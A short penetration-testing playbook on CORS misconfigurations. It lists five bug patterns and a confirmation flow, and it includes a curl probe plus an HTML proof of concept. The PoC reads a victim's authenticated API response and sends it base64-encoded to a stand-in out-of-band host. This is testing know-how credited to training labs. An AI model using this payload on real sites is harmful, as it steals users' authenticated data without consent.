# CORS misconfiguration — playbook

## when to try
- Endpoints that return sensitive data and might reflect the `Origin` header.

## the concrete bug shapes
1. **Reflected origin + credentials**: server replies with
   `Access-Control-Allow-Origin: <your origin>` AND
   `Access-Control-Allow-Credentials: true` → any cross-origin site can read
   the user's authenticated response.
2. **Trusts subdomain wildcards**: `*.target.com` allowed → subdomain takeover or stored XSS on a sibling subdomain → game over.
3. **`null` origin allowed + credentials**: trigger `null` from a sandboxed iframe.
4. **Suffix/prefix match**: regex like `/^https:\/\/.*target\.com$/` → `attacker-target.com` matches.
5. **Pre-flight bypass**: simple requests (GET, POST x-www-form-urlencoded) skip preflight; if the endpoint is state-changing AND CORS-trusts your origin, you can read+write.

## confirmation flow
1. Send a request with `Origin: https://attacker.com`.
2. Look at response headers:
   - `Access-Control-Allow-Origin: https://attacker.com` ← reflected
   - `Access-Control-Allow-Credentials: true` ← credentialed
   Both present + sensitive body = high-impact.
3. PoC: serve a page from `attacker.com` that does `fetch('https://target/api/me', {credentials:'include'}).then(r=>r.text()).then(...)`.

## exploitation snippet
```bash
curl -sk -i -H 'Origin: https://attacker.com' https://t/api/me | grep -i 'access-control'
```

PoC:
```html
<script>
fetch('https://target/api/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://oob/?d='+btoa(t)));
</script>
```

## caveats
- A reflected `Origin` WITHOUT `Allow-Credentials: true` is usually acceptable risk (data is already public).
- Watch for `Vary: Origin` — without it the response gets cached and amplifies impact.

## provenance
PortSwigger CORS labs. Common misconfig in Express + cors() with `origin: true`.
